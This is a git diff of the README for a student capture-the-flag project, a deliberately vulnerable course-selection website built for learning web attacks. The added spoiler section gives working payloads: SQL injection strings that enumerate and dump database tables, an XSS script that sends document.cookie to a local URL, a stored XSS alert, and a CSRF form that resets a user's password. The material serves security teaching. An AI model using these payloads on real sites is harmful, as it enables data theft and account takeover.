@@ -1,4 +1,7 @@
 # 2023 COMP6841 My awesome project
+## UPDATE ON FEB 2024
+`docker compose up` to run
+
 ## Overview of attacks
 Players may find that they can perform a bunch of cyber attackers to this vulnerable website. All the attacks can be found in OWASP top 10 [OWASP TOP10](https://owasp.org/www-project-top-ten/).
 1. SQL Injection
@@ -10,7 +13,8 @@ Players may find that they can perform a bunch of cyber attackers to this vulner
 3. Broken access control
     * When selecing a course with pre-requisite and when you haven't satisfy all the requisite, the website will not allow you to select the course. However, can you bypass the restriction and add COMP9900 to your list?
 4. CSRF
-    * CSRF attack is when some malicious script or program causes user's browser to perform unwanted actions, normally without their consent. Can you write a script to change a logged-in user's password?
+    * CSRF attack is when some malicious script or program causes user's browser to perform unwanted actions, normally without their consent. If you know that your friend's user email is user1@unsw.com, can you write a script to change a logged-in user's password?
+5. Cryptographic Failures
 
 
 ## Structure
@@ -51,22 +55,50 @@ python3 ctf/app.py 5044
 
 ## Spoiler alert 😈
 ### SQL injection 1 🌶 
+- Just use `' or 1=1; --`
 ### SQL injection 2 🥓 
-- How to find out the name of the database? Try `Union` in pgsql. 
-### CSRF 🚨
+- How to find out the name of the database? Try `Union` in pgsql. We firstly use 
+```
+' or 1=1 union select 'a', current_database(); --
+```
+to know the name of the database. It's comp6841db.
+Then, using this to print out all tables' names in comp6841db
+```
+' union select '1', table_name from information_schema.tables where table_catalog='comp6841db' and table_schema = 'public'; --
+```
+to know table's name in this database. It's top_secret.
+Then, using this to select everything in this table
+```
+' union select * from top_secret; -- haha 
+```
 ### Reflected XSS 🛸
-- When you put "abcd" in the question form and submit, you will find the content you typed showing in the url. This can definitely be exploited. Try replace the "abcd" with 
-    ```
-    <script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
-    ```
-    and see where you are redirected. 
+- Thinking about what we learned in lecture, and try putting "abcd" in the question form and submit, you will find the content you typed showing in the url. This can definitely be exploited. Try replace the "abcd" with 
+```
+<script>document.location="http://127.0.0.1:5000/i-am-bad?q="%2Bdocument.cookie</script>
+```
+and see where you are redirected.
 ### Stored XSS 🥞
 - Hmmmm, maybe try using 
-    ```
-    <script>alert("the course is poorly designed")</script>
-    ```
-    in any comment box :D
+```
+<script>alert("the course is poorly designed")</script>
+```
+in any comment box :D
+### CSRF 🚨
+- This html actually does everything that /reset-password does.
+```
+<html>
+    <body>
+        <form action="http://127.0.0.1:5000/reset-password" method="POST">
+            <input type="hidden" name="email" value="z5433878@yuwei" />
+            <input type="hidden" name="new_password" value="password" />
+            <input type="hidden" name="confirm_password" value="password" />
+            <input type="submit" value="Submit request" />
+        </form>
+    </body>    
+</html>
+```
 ### Broken access control 🗝
+
 
 ## Limitations
 This website is designed for cyber security learners to perform attacks. I planned to make a version that protect the website from all the above attacks, for example, with CSRF tokens implemented and sanitizations of user inputs. However, the version is not finished due to the time limit. 
